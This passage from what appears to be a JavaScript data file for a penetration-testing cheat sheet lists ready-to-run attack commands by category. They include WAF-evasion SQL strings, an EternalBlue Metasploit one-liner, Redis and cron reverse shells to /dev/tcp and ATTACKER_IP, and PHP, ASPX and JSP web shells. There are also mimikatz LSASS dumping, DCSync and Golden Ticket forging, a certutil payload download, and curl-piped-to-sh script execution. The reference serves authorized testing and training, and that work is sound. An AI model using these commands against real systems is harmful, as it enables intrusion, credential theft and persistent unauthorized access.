  { track:'bugbounty', cat:'waf-bypass', title:'True-Client-IP header spoofing (Akamai)',
    code:'True-Client-IP: 127.0.0.1',
    note:'Akamai forwards the real visitor IP to the origin in this header. If the origin app trusts it for IP-based access control or rate-limit exemptions without verifying the request actually came through Akamai\'s edge, spoofing it directly against the origin bypasses those checks.' },
  { track:'bugbounty', cat:'waf-bypass', title:'Multipart boundary confusion',
    code:'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary\n(duplicate or malformed boundary markers inside the body)',
    note:'Some CDN/WAF layers (Akamai Kona, generic ModSecurity setups) parse multipart bodies less strictly than the origin application does — a boundary quirk that confuses the edge parser but not the origin\'s can smuggle a payload straight past inspection.' },
  { track:'bugbounty', cat:'waf-bypass', title:'Mixed case + inline comment + encoded whitespace',
    code:'SeLeCT%0a/**/field%0aFrOm%0atable',
    note:'Stacking three evasions at once (case, comments, encoded newlines instead of spaces) defeats WAFs that pattern-match keywords case-sensitively or expect a literal space between tokens — a common combo against Akamai Kona and similar signature-based rulesets.' },

  // ================= PENTESTING =================

  // ---------- enumeration ----------
  { track:'pentesting', cat:'enumeration', title:'Full TCP port scan (all-in-one)',
    code:'nmap -p- -sC -sV --min-rate=5000 -Pn -oN full-scan.txt {IP}',
    note:'The one-liner most people actually reach for first: -p- covers all 65535 ports, --min-rate keeps the send rate high so it doesn\'t take forever, -Pn skips host discovery (works even when ICMP is filtered, the norm on OSCP/HTB boxes), -sC/-sV add default scripts and version detection in the same pass.' },
  { track:'pentesting', cat:'enumeration', title:'Fast full port discovery, then targeted (two-pass)',
    code:'nmap -p- --min-rate=1000 -T4 -Pn {IP} -oN allports.txt\n# then feed only the open ports into a targeted scan:\nnmap -p<ports-found> -sC -sV -Pn {IP} -oN targeted.txt',
    note:'The all-in-one above still runs -sC/-sV against all 65535 ports, which adds up on a slow/filtered host — splitting into a bare fast sweep first, then scripts/version detection only on the ports that came back open, is noticeably quicker when that matters.' },
  { track:'pentesting', cat:'enumeration', title:'SMB / null-session enumeration',
    code:'smbclient -L //{IP} -N\nenum4linux -a {IP}',
    note:'Anonymous/null-session SMB often leaks share names, usernames and OS version before you\'ve authenticated at all — always worth checking first on a Windows target.' },
  { track:'pentesting', cat:'enumeration', title:'NSE vulnerability scripts',
    code:'nmap --script vuln -p 445,80,443 {IP}',
    note:'Runs nmap\'s community vulnerability-detection scripts against specific ports — a fast way to flag obviously outdated or misconfigured services worth digging into further.' },
  { track:'pentesting', cat:'enumeration', title:'Web content discovery',
    code:'ffuf -u https://{DOMAIN}/FUZZ -w raft-medium-directories.txt -mc 200,301,302,403',
    note:'Brute-forces hidden directories/files — pair with -e to also try common extensions, and scope the wordlist to whatever tech stack you already fingerprinted.' },
  { track:'pentesting', cat:'enumeration', title:'Locate domain controllers via SRV records',
    code:'dig SRV _ldap._tcp.dc._msdcs.{DOMAIN} +short',
    note:'Active Directory publishes every domain controller as a DNS SRV record — often faster and quieter than any AD-specific tool for finding all of them before touching anything else.' },
  { track:'pentesting', cat:'enumeration', title:'Global Catalog & Kerberos SRV records',
    code:'dig SRV _gc._tcp.{DOMAIN} +short\ndig SRV _kerberos._tcp.{DOMAIN} +short',
    note:'Beyond plain LDAP, these locate the Global Catalog and Kerberos services specifically — useful when a domain has multiple DCs and you need the one actually serving a given role.' },
  { track:'pentesting', cat:'enumeration', title:'Zone transfer attempt against the DC',
    code:'dig axfr {DOMAIN} @{DC}',
    note:'If zone transfers are misconfigured on internal DNS (more common than you\'d think), this dumps every record in the zone in one request — hostnames, IPs, sometimes systems that were never meant to be discoverable.' },
  { track:'pentesting', cat:'enumeration', title:'Reverse DNS lookup (PTR)',
    code:'dig -x {IP} +short',
    note:'Resolves an IP back to a hostname — a quick way to identify what a given box on the network actually is, especially useful while sweeping a subnet.' },
  { track:'pentesting', cat:'enumeration', title:'Gobuster directory brute-force',
    code:'gobuster dir -u http://{IP} -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html -t 50',
    note:'The Go-based alternative to ffuf — simpler flag syntax and fast by default, a common first reach on an internal web app before pulling out ffuf for anything that needs filtering logic.' },

  // ---------- common-ports ----------
  // A per-port checklist of the classic misconfigurations/exploits pentesters
  // actually check first — standard OSCP/HTB/real-engagement knowledge, not
  // invented syntax. Cross-checked against HackTricks' pentesting-network
  // service pages and PayloadsAllTheThings.
  { track:'pentesting', cat:'common-ports', title:'21/tcp FTP — anonymous login',
    code:'nmap -p21 -sV --script ftp-anon {IP}\nftp {IP}\n# login as: anonymous / anonymous (or blank password)',
    note:'Anonymous FTP is still shockingly common — a readable/writable anonymous share can leak source, configs, or give you an upload path to a webroot if the FTP root overlaps with it.' },
  { track:'pentesting', cat:'common-ports', title:'22/tcp SSH — enum & weak auth',
    code:'nmap -p22 -sV --script ssh2-enum-algos,ssh-auth-methods,ssh-hostkey {IP}\nhydra -L users.txt -P rockyou.txt ssh://{IP}',
    note:'Rarely exploitable directly unless outdated (check the banner against known CVEs), but a prime target for credential spraying once you have a username list from elsewhere on the box/network.' },
  { track:'pentesting', cat:'common-ports', title:'23/tcp Telnet — cleartext creds',
    code:'nmap -p23 -sV --script telnet-encryption {IP}\ntelnet {IP}',
    note:'Everything — including credentials — travels in plaintext, so a passive MITM position on the same segment is enough to harvest logins without touching the target at all.' },
  { track:'pentesting', cat:'common-ports', title:'25/tcp SMTP — user enumeration',
    code:'nmap -p25 --script smtp-enum-users {IP}\nsmtp-user-enum -M VRFY -U users.txt -t {IP}',
    note:'The VRFY/EXPN/RCPT TO commands often respond differently for valid vs invalid users, letting you build a confirmed username list for later password attacks.' },
  { track:'pentesting', cat:'common-ports', title:'53/tcp DNS — recursion & version',
    code:'nmap -p53 -sV --script dns-recursion,dns-nsid {IP}',
    note:'An open recursive resolver reachable from the internet can be abused for DNS amplification, and the version query often fingerprints the exact BIND/Windows DNS build for CVE lookup.' },
  { track:'pentesting', cat:'common-ports', title:'69/udp TFTP — unauthenticated files',
    code:'nmap -p69 -sU --script tftp-enum {IP}\ntftp {IP}\n> get config.txt',
    note:'TFTP has no authentication at all — routers, switches and PXE boot setups frequently expose config backups or boot images over it that hand you credentials or full device configs.' },
  { track:'pentesting', cat:'common-ports', title:'88/tcp Kerberos — AS-REP roasting',
    code:'kerbrute userenum -d {DOMAIN} --dc {DC} users.txt\nimpacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -dc-ip {DC} -no-pass',
    note:'Any account with "Do not require Kerberos preauthentication" set leaks a crackable TGT hash to an unauthenticated request — the fastest low-hanging fruit on a domain-joined box.' },
  { track:'pentesting', cat:'common-ports', title:'111/tcp rpcbind — NFS export enum',
    code:'rpcinfo -p {IP}\nshowmount -e {IP}',
    note:'rpcinfo reveals every RPC service registered on the box (often including NFS/NIS); showmount then lists exported shares, some of which turn out to be world-mountable.' },
  { track:'pentesting', cat:'common-ports', title:'135/tcp MSRPC — endpoint mapper',
    code:'rpcdump.py {IP} | grep -i \'ncacn_ip_tcp\'\nnmap -p135 --script msrpc-enum {IP}',
    note:'Enumerates every RPC interface exposed by the box, which is how you discover extra dynamically-allocated high ports (49152+) that map back to services like the spooler or DCOM.' },
  { track:'pentesting', cat:'common-ports', title:'139+445/tcp SMB — EternalBlue check',
    code:'nmap -p445 --script smb-vuln-ms17-010 {IP}\nmsfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {IP}; run"',
    note:'MS17-010 is old but still turns up constantly on stale internal Windows 7/Server 2008 boxes — unauthenticated remote SYSTEM if it hits, always worth a quick check.' },
  { track:'pentesting', cat:'common-ports', title:'161/udp SNMP — public community string',
    code:'snmpwalk -c public -v1 {IP}\nonesixtyone -c community-strings.txt {IP}',
    note:'"public" (read) and "private" (read-write) are the classic default community strings — a working one can dump running processes, installed software, routing tables and sometimes cleartext credentials.' },
  { track:'pentesting', cat:'common-ports', title:'389/636 LDAP — anonymous bind',
    code:'ldapsearch -x -H ldap://{IP} -s base namingcontexts\nldapsearch -x -H ldap://{IP} -b "DC=domain,DC=local"',
    note:'Anonymous bind (still enabled by default on many domain controllers) lets you dump the entire directory — users, groups, OUs, password policy — before authenticating at all.' },
  { track:'pentesting', cat:'common-ports', title:'1433/tcp MSSQL — sa / xp_cmdshell',
    code:'impacket-mssqlclient sa@{IP} -windows-auth\nSQL> EXEC sp_configure \'xp_cmdshell\', 1; RECONFIGURE; EXEC xp_cmdshell \'whoami\';',
    note:'A blank or default sa password plus xp_cmdshell (disabled by default but frequently re-enabled by admins) is a direct path to OS command execution as the SQL service account.' },
  { track:'pentesting', cat:'common-ports', title:'2049/tcp NFS — no_root_squash',
    code:'showmount -e {IP}\nmount -t nfs {IP}:/share /mnt/nfs\n# if no_root_squash: create a SUID binary as root from your attacking box',
    note:'When a share is exported with no_root_squash, root on your machine maps to root on the share — plant a SUID shell there and it\'s instant privesc if the target ever executes it locally.' },
  { track:'pentesting', cat:'common-ports', title:'2375/tcp Docker API — unauth remote root',
    code:'docker -H tcp://{IP}:2375 ps\ndocker -H tcp://{IP}:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh',
    note:'The Docker daemon socket exposed over TCP with no TLS/auth hands you container creation — mount the host filesystem into a throwaway container and you have root on the host.' },
  { track:'pentesting', cat:'common-ports', title:'3306/tcp MySQL — default creds',
    code:'mysql -h {IP} -u root\nmysql -h {IP} -u root -p{PASS} -e "SELECT \'PoC\' INTO OUTFILE \'/var/www/html/poc.php\' FIELDS TERMINATED BY \'<?php system($_GET[c]);?>\'"',
    note:'root with a blank password is still common on dev/internal boxes; with FILE privilege you can often write a webshell straight into the document root if the paths line up.' },
  { track:'pentesting', cat:'common-ports', title:'3389/tcp RDP — BlueKeep & NLA',
    code:'nmap -p3389 --script rdp-vuln-ms12-020,rdp-ntlm-info {IP}\nxfreerdp /u:{USER} /p:{PASS} /v:{IP}',
    note:'rdp-ntlm-info leaks the hostname/domain/OS build without auth; boxes still missing the BlueKeep (CVE-2019-0708) patch allow unauthenticated pre-auth RCE.' },
  { track:'pentesting', cat:'common-ports', title:'5432/tcp PostgreSQL — COPY PROGRAM RCE',
    code:'psql -h {IP} -U postgres\npostgres=# COPY (SELECT \'\') TO PROGRAM \'id > /tmp/poc\';',
    note:'On PostgreSQL 9.3+, an authenticated superuser session can execute arbitrary shell commands via COPY ... TO PROGRAM — a direct RCE primitive that\'s easy to miss.' },
  { track:'pentesting', cat:'common-ports', title:'5900/tcp VNC — no-auth / weak auth',
    code:'nmap -p5900 --script vnc-info,realvnc-auth-bypass {IP}\nvncviewer {IP}::5900',
    note:'Plenty of internal VNC servers run with no password at all or with the 8-character-max legacy DES auth, which is trivially brute-forceable — instant desktop access when it hits.' },
  { track:'pentesting', cat:'common-ports', title:'5985/5986 WinRM — evil-winrm shell',
    code:'evil-winrm -i {IP} -u {USER} -p {PASS}',
    note:'Any account in the local Remote Management Users / Administrators group gets a full interactive PowerShell session over WinRM — the go-to for lateral movement once you have valid creds.' },
  { track:'pentesting', cat:'common-ports', title:'6379/tcp Redis — unauth write RCE',
    code:'redis-cli -h {IP}\n127.0.0.1:6379> CONFIG SET dir /var/spool/cron/\n127.0.0.1:6379> CONFIG SET dbfilename root\n127.0.0.1:6379> SET x "\\n* * * * * bash -c \'bash -i >& /dev/tcp/{IP}/4444 0>&1\'\\n"\n127.0.0.1:6379> SAVE',
    note:'Redis has no auth by default and pre-6.0 has no ACLs — writing a crontab entry (or an authorized_keys / webshell) via CONFIG SET + SAVE is the classic unauthenticated-Redis-to-RCE chain.' },
  { track:'pentesting', cat:'common-ports', title:'8080/8443 — alt HTTP admin panels',
    code:'nmap -p8080,8443,8000,8888 -sV {IP}\nffuf -u http://{IP}:8080/FUZZ -w common-panels.txt',
    note:'Non-standard HTTP(S) ports are where admin consoles, Tomcat/Jenkins/phpMyAdmin managers and dev-only endpoints tend to live, often with weaker auth than the primary web app on 80/443.' },
  { track:'pentesting', cat:'common-ports', title:'9200/tcp Elasticsearch — unauth API',
    code:'curl {IP}:9200/_cat/indices?v\ncurl {IP}:9200/_search?pretty',
    note:'Pre-X-Pack (and plenty of still-misconfigured modern) Elasticsearch has zero authentication on its REST API — full read of every index, and scripted-field queries can lead to RCE on old versions (CVE-2015-1427/CVE-2014-3120).' },
  { track:'pentesting', cat:'common-ports', title:'11211/udp Memcached — unauth data dump',
    code:'echo -e "stats items\\r\\nquit\\r\\n" | nc {IP} 11211\necho -e "stats cachedump 1 0\\r\\nquit\\r\\n" | nc {IP} 11211',
    note:'No authentication and cleartext protocol — an exposed cache frequently holds session tokens, API keys or cached credentials, and is also a favorite DDoS-amplification vector.' },
  { track:'pentesting', cat:'common-ports', title:'27017/tcp MongoDB — unauth access',
    code:'mongo {IP}:27017\n> show dbs\n> use admin\n> db.system.users.find()',
    note:'MongoDB historically bound to 0.0.0.0 with auth disabled by default — full read/write on every database, including in many cases the credential collection for the app itself.' },

  // ---------- wordpress ----------
  { track:'pentesting', cat:'wordpress', title:'WPScan full vulnerability scan',
    code:'wpscan --url https://{DOMAIN} --enumerate vp,vt --api-token YOUR_WPSCAN_TOKEN',
    note:'The standard first move — enumerates installed plugins/themes and cross-references them against WPScan\'s CVE database (free API token from wpscan.com covers a generous daily quota).' },
  { track:'pentesting', cat:'wordpress', title:'WPScan user enumeration',
    code:'wpscan --url https://{DOMAIN} --enumerate u',
    note:'Pulls valid usernames via author archive pages and the login error messages — feeds directly into the password brute-force below.' },
  { track:'pentesting', cat:'wordpress', title:'WPScan aggressive plugin enumeration',
    code:'wpscan --url https://{DOMAIN} --enumerate ap --plugins-detection aggressive',
    note:'Passive detection only catches plugins referenced in the page source; aggressive mode actively requests known plugin paths, finding far more — including ones the theme never links to.' },
  { track:'pentesting', cat:'wordpress', title:'WPScan password brute-force',
    code:'wpscan --url https://{DOMAIN} -U {USER} -P rockyou.txt',
    note:'Runs the wp-login.php form against a wordlist for the given username — throttle with --max-scan-duration or a proxy chain on anything with lockout/WAF protection.' },
  { track:'pentesting', cat:'wordpress', title:'REST API user enumeration (no tool needed)',
    code:'curl -s https://{DOMAIN}/wp-json/wp/v2/users | jq',
    note:'The REST API leaks registered usernames and display names by default on most installs — works even when author-archive-based enumeration is blocked, and needs nothing but curl.' },
  { track:'pentesting', cat:'wordpress', title:'xmlrpc.php exposure check',
    code:'curl -s -o /dev/null -w "%{http_code}\\n" https://{DOMAIN}/xmlrpc.php',
    note:'If it responds 200, system.multicall lets an attacker bundle thousands of login attempts into a handful of HTTP requests — a huge brute-force amplifier that bypasses simple per-request rate limiting. Should normally be disabled or blocked at the edge.' },

  // ---------- linux-privesc ----------
  { track:'pentesting', cat:'linux-privesc', title:'SUID binary enumeration',
    code:'find / -perm -4000 -type f 2>/dev/null',
    note:'Lists every binary that runs as its owner (often root) regardless of who executes it — cross-reference hits against GTFOBins for a known escalation path.' },
  { track:'pentesting', cat:'linux-privesc', title:'Sudo rights check',
    code:'sudo -l',
    note:'Shows exactly which commands the current user can run as another user without a password — if it\'s a binary GTFOBins knows how to abuse, that\'s a fast root shell.' },
  { track:'pentesting', cat:'linux-privesc', title:'Writable cron job',
    code:'cat /etc/crontab; ls -la /etc/cron.*/',
    note:'A cron job root runs that points at a script you can write to is a reliable, if slow, path to a root shell on the next tick.' },
  { track:'pentesting', cat:'linux-privesc', title:'Automated enumeration (linPEAS)',
    code:'curl -s https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh | sh',
    note:'Checks dozens of privesc vectors at once (SUID, capabilities, cron, sudo, kernel version, credentials left in files...) and color-codes the interesting findings — a good first move on any box.' },
  { track:'pentesting', cat:'linux-privesc', title:'Capabilities check',
    code:'getcap -r / 2>/dev/null',
    note:'Linux capabilities grant a binary specific root-like powers (e.g. cap_setuid) without the SUID bit — an escalation path people who only check for SUID commonly miss.' },
  { track:'pentesting', cat:'linux-privesc', title:'Writable /etc/passwd',
    code:'openssl passwd -1 -salt abc password123\n# then append: newroot:<hash>:0:0:root:/root:/bin/bash  >> /etc/passwd',
    note:'If /etc/passwd itself is writable, you can add a brand-new UID-0 user with a password you know — no exploit needed, just a misconfigured file permission.' },
  { track:'pentesting', cat:'linux-privesc', title:'Docker socket breakout',
    code:'docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh',
    note:'If the current user can talk to the host\'s Docker socket, spinning up a container with the host filesystem mounted gives a root shell on the host itself.' },

  // ---------- windows-privesc ----------
  { track:'pentesting', cat:'windows-privesc', title:'Privilege check',
    code:'whoami /priv',
    note:'Look for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege enabled — either one usually means a PrintSpoofer/JuicyPotato-style token impersonation exploit gets you SYSTEM.' },
  { track:'pentesting', cat:'windows-privesc', title:'Unquoted service path',
    code:'wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\\\"',
    note:'An unquoted path with spaces like C:\\Program Files\\My App\\service.exe lets Windows try C:\\Program.exe first — if you can write there, that binary runs as whatever the service runs as.' },
  { track:'pentesting', cat:'windows-privesc', title:'AlwaysInstallElevated check',
    code:'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
    note:'If this (and the matching HKCU key) is set to 1, any user can run an MSI package with SYSTEM privileges — msfvenom -f msi builds a malicious one in seconds.' },
  { track:'pentesting', cat:'windows-privesc', title:'Automated enumeration (PowerUp)',
    code:'powershell -ep bypass -c ". .\\PowerUp.ps1; Invoke-AllChecks"',
    note:'Runs through the same checklist by hand would take — services, registry, scheduled tasks, DLL hijacking candidates — and flags anything obviously abusable.' },
  { track:'pentesting', cat:'windows-privesc', title:'PrintSpoofer (SeImpersonate to SYSTEM)',
    code:'PrintSpoofer.exe -i -c cmd',
    note:'Once whoami /priv confirms SeImpersonatePrivilege, PrintSpoofer abuses the print spooler service to coerce a SYSTEM-privileged named pipe connection you can impersonate — a fast, reliable path from a service account to SYSTEM.' },

  // ---------- active-directory ----------
  { track:'pentesting', cat:'active-directory', title:'Kerbrute username enumeration',
    code:'kerbrute userenum -d {DOMAIN} --dc {DC} userlist.txt',
    note:'Abuses Kerberos pre-auth responses to check whether a username exists — much quieter than a real login attempt and doesn\'t trigger account lockout, so it\'s the standard first move before any password attack.' },
  { track:'pentesting', cat:'active-directory', title:'Kerberoasting',
    code:'GetUserSPNs.py {DOMAIN}/{USER}:{PASS} -request -dc-ip {IP}',
    note:'Requests a Kerberos service ticket for every account with a registered SPN, encrypted with that account\'s password hash — crack it offline instead of touching the DC again.' },
  { track:'pentesting', cat:'active-directory', title:'AS-REP roasting',
    code:'GetNPUsers.py {DOMAIN}/ -usersfile users.txt -no-pass -dc-ip {IP}',
    note:'Targets accounts with Kerberos pre-authentication disabled — you can request their AS-REP and crack it offline without ever supplying a password.' },
  { track:'pentesting', cat:'active-directory', title:'BloodHound collection',
    code:"bloodhound-python -u {USER} -p '{PASS}' -d {DOMAIN} -ns {IP} -c All",
    note:'Pulls the domain\'s users, groups, sessions and ACLs into a graph so you can visually trace the shortest path from your current foothold to Domain Admin.' },
  { track:'pentesting', cat:'active-directory', title:'Pass-the-hash',
    code:'evil-winrm -i {IP} -u {USER} -H {HASH}',
    note:'Authenticates with the raw NTLM hash instead of a cleartext password — useful the moment you dump hashes on one box and want to reuse them elsewhere.' },
  { track:'pentesting', cat:'active-directory', title:'DCSync',
    code:'secretsdump.py -just-dc-ntlm {DOMAIN}/{USER}:{PASS}@{IP}',
    note:'If the compromised account has Replicating Directory Changes rights, this impersonates a domain controller and asks a real DC to replicate every user\'s password hash straight to you.' },
  { track:'pentesting', cat:'active-directory', title:'Golden Ticket',
    code:'ticketer.py -nthash {HASH} -domain-sid <SID> -domain {DOMAIN} Administrator',
    note:'Once you have the krbtgt account\'s hash (use the hash field above for it), you can forge a Kerberos TGT for any user, including one that doesn\'t even exist — valid until someone rotates krbtgt twice.' },
  { track:'pentesting', cat:'active-directory', title:'Silver Ticket',
    code:'ticketer.py -nthash {HASH} -domain-sid <SID> -domain {DOMAIN} -spn cifs/{DC} Administrator',
    note:'Forges a service ticket for one specific service using that service account\'s hash — narrower than a Golden Ticket but skips krbtgt and the DC entirely, so it\'s stealthier.' },
  { track:'pentesting', cat:'active-directory', title:'Rubeus: request a TGT',
    code:'Rubeus.exe asktgt /user:{USER} /password:{PASS} /domain:{DOMAIN} /dc:{DC}',
    note:'Requests a Kerberos TGT directly against a named DC and loads it into the current session — the Windows-native starting point before kerberoasting, ticket forging or delegation abuse.' },
  { track:'pentesting', cat:'active-directory', title:'PetitPotam coercion',
    code:'PetitPotam.exe <listener-ip> {DC}',
    note:'Forces the domain controller to authenticate to a host you control via the MS-EFSRPC API — classic setup move before relaying that authentication (NTLM relay) or harvesting it from an unconstrained-delegation box.' },
  { track:'pentesting', cat:'active-directory', title:'Unconstrained delegation abuse',
    code:'Rubeus.exe monitor /interval:5 /filteruser:{DC}$',
    note:'A computer account with unconstrained delegation caches a copy of every Kerberos TGT that authenticates to it — coerce the DC to connect (e.g. via PetitPotam above) and harvest its TGT from memory.' },

  // ---------- mimikatz ----------
  { track:'pentesting', cat:'mimikatz', title:'Dump credentials from LSASS',
    code:'privilege::debug\nsekurlsa::logonpasswords',
    note:'The single most-run mimikatz combo — elevates to debug privilege, then dumps every cleartext password, NTLM hash and Kerberos ticket currently cached in LSASS memory.' },
  { track:'pentesting', cat:'mimikatz', title:'Pass-the-hash',
    code:'sekurlsa::pth /user:{USER} /domain:{DOMAIN} /ntlm:{HASH} /run:cmd.exe',
    note:'Spawns a new process pre-loaded with the given NTLM hash, authenticating as that user on any subsequent network connection without ever knowing the plaintext password.' },
  { track:'pentesting', cat:'mimikatz', title:'DCSync (native)',
    code:'lsadump::dcsync /domain:{DOMAIN} /user:krbtgt',
    note:'The mimikatz-native version of the DCSync attack — pulls a specific account\'s password hash straight from a real DC\'s replication data if your current user has replication rights.' },

  // ---------- password-attacks ----------
  { track:'pentesting', cat:'password-attacks', title:'Hydra SSH bruteforce',
    code:'hydra -l {USER} -P rockyou.txt ssh://{IP}',
    note:'Straightforward online bruteforce — throttle it (-t) on real engagements, SSH lockout/rate-limiting will otherwise blow your window or trip an alert.' },
  { track:'pentesting', cat:'password-attacks', title:'Hydra RDP bruteforce',
    code:'hydra -l {USER} -P rockyou.txt rdp://{IP}',
    note:'Same idea against RDP — much noisier and slower than SSH, and Windows account lockout policy will usually catch you first, so this is a last resort or a deliberately narrow attempt with a short, curated password list.' },
  { track:'pentesting', cat:'password-attacks', title:'Hashcat NTLM cracking',
    code:'hashcat -m 1000 hashes.txt rockyou.txt',
    note:'Mode 1000 is NTLM — hashcat\'s -m flag tells it how to interpret the hash format; getting this number right (hashcat --example-hashes) matters more than the wordlist for a fast crack.' },
  { track:'pentesting', cat:'password-attacks', title:'Password spray (CrackMapExec)',
    code:"crackmapexec smb {IP}/24 -u users.txt -p '{PASS}' --continue-on-success",
    note:'One password against every user across every host in a single pass — stays under per-account lockout thresholds where a per-user bruteforce would trip them instantly.' },
  { track:'pentesting', cat:'password-attacks', title:'John the Ripper with rules',
    code:'john --wordlist=rockyou.txt --rules hashes.txt',
    note:'Rules mutate each wordlist entry (capitalization, leetspeak, appended digits) before trying it — usually cracks far more real-world passwords than the raw wordlist alone.' },

  // ---------- lateral-movement ----------
  { track:'pentesting', cat:'lateral-movement', title:'WinRM interactive session',
    code:'Enter-PSSession -ComputerName {IP} -Credential (Get-Credential)',
    note:'Native PowerShell remoting — if the target user is a local admin or in the Remote Management Users group on the destination, this drops you into an interactive shell with no extra tooling needed.' },
  { track:'pentesting', cat:'lateral-movement', title:'CrackMapExec across a subnet',
    code:'crackmapexec smb {IP}/24 -u {USER} -H {HASH} -x whoami',
    note:'Runs one command against every host in the range using the same credential — the fastest way to find out how far a single set of admin creds actually reaches.' },

  // ---------- impacket ----------
  { track:'pentesting', cat:'impacket', title:'psexec.py',
    code:'psexec.py {DOMAIN}/{USER}:{PASS}@{IP}',
    note:'Uploads a service binary over SMB and runs it via the Service Control Manager — drops you into a SYSTEM shell, the Python/impacket equivalent of the classic Sysinternals PsExec.' },
  { track:'pentesting', cat:'impacket', title:'wmiexec.py',
    code:'wmiexec.py {DOMAIN}/{USER}:{PASS}@{IP}',
    note:'Executes commands via WMI instead of dropping a service binary to disk — quieter than psexec.py since nothing gets written to the target\'s filesystem.' },
  { track:'pentesting', cat:'impacket', title:'secretsdump.py',
    code:'secretsdump.py {DOMAIN}/{USER}:{PASS}@{IP}',
    note:'Dumps local SAM hashes, cached domain credentials and LSA secrets remotely over SMB — usually the very next command after landing admin on any single box.' },

  // ---------- path-hijacking ----------
  { track:'pentesting', cat:'path-hijacking', title:'Writable PATH directory',
    code:'echo $PATH\n# find a writable dir in it, then drop a binary named after a command root\'s cron/scripts call',
    note:'If any directory in root\'s PATH is writable and a privileged script calls a command without an absolute path, your fake binary runs instead of the real one.' },
  { track:'pentesting', cat:'path-hijacking', title:'LD_PRELOAD via sudo',
    code:'sudo LD_PRELOAD=/tmp/evil.so some_allowed_binary',
    note:'If sudo -l shows LD_PRELOAD is preserved (env_keep) for a command you can run, a shared object with a constructor function loads and executes as root before the real binary even starts.' },

  // ---------- containers-k8s ----------
  { track:'pentesting', cat:'containers-k8s', title:'Check your effective permissions first',
    code:'kubectl auth can-i --list\nkubectl exec -it <pod> -- /bin/sh',
    note:'Always check what your current service account/kubeconfig is actually allowed to do first — a pod you can exec into is often just the first step, not the goal.' },
  { track:'pentesting', cat:'containers-k8s', title:'Service account token theft',
    code:'cat /var/run/secrets/kubernetes.io/serviceaccount/token',
    note:'Every pod gets a service account token mounted by default unless explicitly disabled — read it and you can hit the Kubernetes API as that pod\'s identity, potentially with far more privilege than the pod itself needed.' },
  { track:'pentesting', cat:'containers-k8s', title:'Privileged container escape',
    code:'docker run --privileged -v /:/host -it alpine chroot /host sh',
    note:'A container started with --privileged has essentially no isolation left — mounting the host filesystem and chrooting into it is a straight line from "inside a container" to "root on the host".' },

  // ---------- web-shells ----------
  { track:'pentesting', cat:'web-shells', title:'PHP one-liner',
    code:"<?php system($_GET['cmd']); ?>",
    note:'The bare minimum web shell — drop it wherever a file upload or LFI lets you plant a .php file, then hit ?cmd=id.' },
  { track:'pentesting', cat:'web-shells', title:'ASPX cmd shell',
    code:'<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>',
    note:'Equivalent one-liner for IIS targets where a .aspx file can be uploaded or written.' },
  { track:'pentesting', cat:'web-shells', title:'JSP cmd shell',
    code:'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
    note:'Same idea for Java/Tomcat targets that accept a .jsp upload.' },

  // ---------- file-transfer ----------
  { track:'pentesting', cat:'file-transfer', title:'Quick HTTP server',
    code:'python3 -m http.server 8000',
    note:'The fastest way to serve a tool (linpeas.sh, a binary, whatever) from your attack box so the target can curl/wget it over the network.' },
  { track:'pentesting', cat:'file-transfer', title:'Windows download via certutil',
    code:'certutil -urlcache -split -f http://ATTACKER_IP:8000/file.exe file.exe',
    note:'A living-off-the-land download trick for Windows boxes with no direct internet access, or where PowerShell download cradles are being flagged.' },
  { track:'pentesting', cat:'file-transfer', title:'Base64 copy-paste exfil',
    code:'base64 -w0 file.txt\n# paste the output back through the shell you already have, then:\nbase64 -d -i pasted.txt > file.txt',
    note:'When there\'s no real network path for a file transfer at all, this pushes the file through the text channel you already have — fine for small files, painful for anything large.' },

  // ---------- port-forwarding ----------
  { track:'pentesting', cat:'port-forwarding', title:'SSH local port forward',
    code:'ssh -L 8080:internal-host:80 user@jumpbox',
    note:'Makes a service only reachable from the jumpbox available on your own machine at localhost:8080 — the standard way to reach an internal web app through a single SSH foothold.' },
  { track:'pentesting', cat:'port-forwarding', title:'SSH dynamic SOCKS proxy',
    code:'ssh -D 1080 user@jumpbox\n# then point proxychains at 127.0.0.1:1080',
    note:'One SSH connection becomes a full SOCKS proxy into the target network — route any tool through it with proxychains instead of forwarding ports one at a time.' },
  { track:'pentesting', cat:'port-forwarding', title:'Chisel reverse tunnel (no SSH needed)',
    code:'# attacker: chisel server -p 8000 --reverse\n# target:   chisel client ATTACKER_IP:8000 R:socks',
    note:'When the foothold has no SSH and only outbound HTTP works, Chisel tunnels a SOCKS proxy back to you over a plain HTTP(S) connection.' },
  { track:'pentesting', cat:'port-forwarding', title:'socat TCP relay',
    code:'socat TCP-LISTEN:8080,fork TCP:internal-host:80',
    note:'A simple TCP relay when SSH isn\'t available on the pivot box — forwards anything hitting :8080 straight through to the internal target.' },
  { track:'pentesting', cat:'port-forwarding', title:'plink SSH tunnel (from Windows)',
    code:'plink.exe -ssh -L 8080:internal-host:80 user@jumpbox -pw password',
    note:'PuTTY\'s command-line client does the same job as ssh -L when you\'re pivoting from a Windows box with no native ssh.exe.' },

  // ---------- persistence ----------
  { track:'pentesting', cat:'persistence', title:'Cron backdoor',
    code:'(crontab -l; echo "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\'") | crontab -',
    note:'Adds a reverse shell callback that fires every minute — a simple, durable way to keep authorized access on a box across reboots during an engagement.' },
  { track:'pentesting', cat:'persistence', title:'Scheduled task (Windows)',
    code:'schtasks /create /sc minute /mo 1 /tn "Updater" /tr "C:\\Windows\\Temp\\shell.exe" /ru SYSTEM',
    note:'Windows\' equivalent of a cron backdoor — a boring name like "Updater" is usually enough to survive a casual glance at the task list.' },
  { track:'pentesting', cat:'persistence', title:'SSH authorized_keys drop',
    code:'echo "ssh-rsa AAAA...your-pubkey" >> ~/.ssh/authorized_keys',
    note:'Drops your own public key onto the box for password-less re-entry — quieter and more reliable than a persistent reverse shell process that can simply be killed.' },

  // ---------- mitm ----------
